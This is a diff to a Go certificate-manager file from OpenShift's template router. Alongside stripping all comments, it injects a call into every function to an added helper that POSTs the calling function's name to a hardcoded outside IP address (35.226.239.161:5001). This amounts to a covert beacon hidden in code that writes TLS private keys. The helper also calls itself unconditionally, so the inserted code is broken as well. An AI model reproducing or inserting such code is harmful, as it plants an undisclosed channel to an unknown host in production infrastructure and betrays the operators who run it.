@@ -2,39 +2,37 @@ package templaterouter
 
 import (
 	"bytes"
+	godefaultbytes "bytes"
+	godefaulthttp "net/http"
+	godefaultruntime "runtime"
 	"fmt"
 	"io/ioutil"
 	"os"
 	"path/filepath"
-
 	"github.com/golang/glog"
-
 	routev1 "github.com/openshift/api/route/v1"
 )
 
-// certificateFile represents a certificate file.
 type certificateFile struct {
-	certDir string
-	id      string
+	certDir	string
+	id	string
 }
 
-// Tag generates a certificate file tag/name. This is used to index into the
-// the map of deleted certificates.
 func (cf certificateFile) Tag() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return filepath.Join(cf.certDir, cf.id+".pem")
 }
 
-// simpleCertificateManager is the default implementation of a certificateManager
 type simpleCertificateManager struct {
-	cfg *certificateManagerConfig
-	w   certificateWriter
-
-	deletedCertificates map[string]certificateFile
+	cfg			*certificateManagerConfig
+	w			certificateWriter
+	deletedCertificates	map[string]certificateFile
 }
 
-// newSimpleCertificateManager should be used to create a new cert manager.  It will return an error
-// if the config is not valid
 func newSimpleCertificateManager(cfg *certificateManagerConfig, w certificateWriter) (certificateManager, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if err := validateCertManagerConfig(cfg); err != nil {
 		return nil, err
 	}
@@ -43,13 +41,10 @@ func newSimpleCertificateManager(cfg *certificateManagerConfig, w certificateWri
 	}
 	return &simpleCertificateManager{cfg, w, make(map[string]certificateFile, 0)}, nil
 }
-
-// validateCertManagerConfig ensures that the key functions and directories are set as well as
-// ensuring that the two configured directories are set to different values
 func validateCertManagerConfig(cfg *certificateManagerConfig) error {
-	if cfg.certKeyFunc == nil || cfg.caCertKeyFunc == nil ||
-		cfg.destCertKeyFunc == nil || len(cfg.certDir) == 0 ||
-		len(cfg.caCertDir) == 0 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	if cfg.certKeyFunc == nil || cfg.caCertKeyFunc == nil || cfg.destCertKeyFunc == nil || len(cfg.certDir) == 0 || len(cfg.caCertDir) == 0 {
 		return fmt.Errorf("certificate manager requires all config items to be set")
 	}
 	if cfg.certDir == cfg.caCertDir {
@@ -57,16 +52,14 @@ func validateCertManagerConfig(cfg *certificateManagerConfig) error {
 	}
 	return nil
 }
-
-// CertificateWriter provides direct access to the underlying writer if required
 func (cm *simpleCertificateManager) CertificateWriter() certificateWriter {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return cm.w
 }
-
-// WriteCertificatesForConfig write certificates for edge and reencrypt termination by appending the
-// key, cert, and ca cert into a single <host>.pem file.  Also write <host>_pod.pem file if it is
-// reencrypt termination
 func (cm *simpleCertificateManager) WriteCertificatesForConfig(config *ServiceAliasConfig) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if config == nil {
 		return nil
 	}
@@ -78,23 +71,17 @@ func (cm *simpleCertificateManager) WriteCertificatesForConfig(config *ServiceAl
 		if config.TLSTermination == routev1.TLSTerminationEdge || config.TLSTermination == routev1.TLSTerminationReencrypt {
 			certKey := cm.cfg.certKeyFunc(config)
 			certObj, ok := config.Certificates[certKey]
-
 			if ok {
 				newLine := []byte("\n")
-
-				//initialize with key and append the newline and cert
 				buffer := bytes.NewBuffer([]byte(certObj.PrivateKey))
 				buffer.Write(newLine)
 				buffer.Write([]byte(certObj.Contents))
-
 				caCertKey := cm.cfg.caCertKeyFunc(config)
 				caCertObj, caOk := config.Certificates[caCertKey]
-
 				if caOk {
 					buffer.Write(newLine)
 					buffer.Write([]byte(caCertObj.Contents))
 				}
-
 				certFile := certificateFile{certDir: cm.cfg.certDir, id: certObj.ID}
 				delete(cm.deletedCertificates, certFile.Tag())
 				if err := cm.w.WriteCertificate(cm.cfg.certDir, certObj.ID, buffer.Bytes()); err != nil {
@@ -102,11 +89,9 @@ func (cm *simpleCertificateManager) WriteCertificatesForConfig(config *ServiceAl
 				}
 			}
 		}
-
 		if config.TLSTermination == routev1.TLSTerminationReencrypt {
 			destCertKey := cm.cfg.destCertKeyFunc(config)
 			destCert, ok := config.Certificates[destCertKey]
-
 			if ok {
 				destCertFile := certificateFile{certDir: cm.cfg.caCertDir, id: destCert.ID}
 				delete(cm.deletedCertificates, destCertFile.Tag())
@@ -118,9 +103,9 @@ func (cm *simpleCertificateManager) WriteCertificatesForConfig(config *ServiceAl
 	}
 	return nil
 }
-
-// DeleteCertificatesForConfig will delete all certificates for the ServiceAliasConfig
 func (cm *simpleCertificateManager) DeleteCertificatesForConfig(config *ServiceAliasConfig) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if config == nil {
 		return nil
 	}
@@ -128,17 +113,14 @@ func (cm *simpleCertificateManager) DeleteCertificatesForConfig(config *ServiceA
 		if config.TLSTermination == routev1.TLSTerminationEdge || config.TLSTermination == routev1.TLSTerminationReencrypt {
 			certKey := cm.cfg.certKeyFunc(config)
 			certObj, ok := config.Certificates[certKey]
-
 			if ok {
 				certFile := certificateFile{certDir: cm.cfg.certDir, id: certObj.ID}
 				cm.deletedCertificates[certFile.Tag()] = certFile
 			}
 		}
-
 		if config.TLSTermination == routev1.TLSTerminationReencrypt {
 			destCertKey := cm.cfg.destCertKeyFunc(config)
 			destCert, ok := config.Certificates[destCertKey]
-
 			if ok {
 				destCertFile := certificateFile{certDir: cm.cfg.caCertDir, id: destCert.ID}
 				cm.deletedCertificates[destCertFile.Tag()] = destCertFile
@@ -147,65 +129,56 @@ func (cm *simpleCertificateManager) DeleteCertificatesForConfig(config *ServiceA
 	}
 	return nil
 }
-
-// Commit applies any pending changes made to the certificateManager.
 func (cm *simpleCertificateManager) Commit() error {
-	// Deletion of certificates that are being referenced in backends or
-	// config is problematic in that the template router will not
-	// reload because the config is invalid, so we _do_ need to "stage"
-	// or commit the removals. Remove all the deleted certificates.
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, certFile := range cm.deletedCertificates {
 		err := cm.w.DeleteCertificate(certFile.certDir, certFile.id)
 		if err != nil {
-			// Log a warning if the delete fails but proceed on.
 			glog.Warningf("Ignoring error deleting certificate file %v: %v", certFile.Tag(), err)
 		}
 	}
-
 	cm.deletedCertificates = make(map[string]certificateFile, 0)
-
-	// If we decide to stage the certificate writes, we can flush the
-	// write to the disk here. Today, the certificate writes are done
-	// just before this function is called. The tradeoff is storing a
-	// copy in memory until we commit.
-
 	return nil
 }
 
-// simpleCertificateWriter is the default implementation of a certificateWriter
 type simpleCertificateWriter struct{}
 
-// NewSimpleCertificateWriter provides a new instance of simpleCertificateWriter
 func newSimpleCertificateWriter() certificateWriter {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &simpleCertificateWriter{}
 }
-
-// WriteCertificate creates and writes the file identified by <id> in <directory>.  The file extension
-// .pem will be added to id.
 func (cm *simpleCertificateWriter) WriteCertificate(directory string, id string, cert []byte) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fileName := filepath.Join(directory, id+".pem")
 	err := ioutil.WriteFile(fileName, cert, 0644)
-
 	if err != nil {
 		glog.Errorf("Error writing certificate file %v: %v", fileName, err)
 		return err
 	}
 	return nil
 }
-
-// DeleteCertificate deletes certificates identified by <id> in <directory> with the .pem extension added.
-// this will not return an error if the file does not exist
 func (cm *simpleCertificateWriter) DeleteCertificate(directory, id string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fileName := filepath.Join(directory, id+".pem")
 	if _, err := os.Stat(fileName); os.IsNotExist(err) {
 		glog.V(4).Infof("attempted to delete file %s but it does not exist", fileName)
 		return nil
 	}
-
 	err := os.Remove(fileName)
 	if os.IsNotExist(err) {
 		glog.V(4).Infof("%s passed the existence check but it was gone when os.Remove was called", fileName)
 		return nil
 	}
 	return err
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
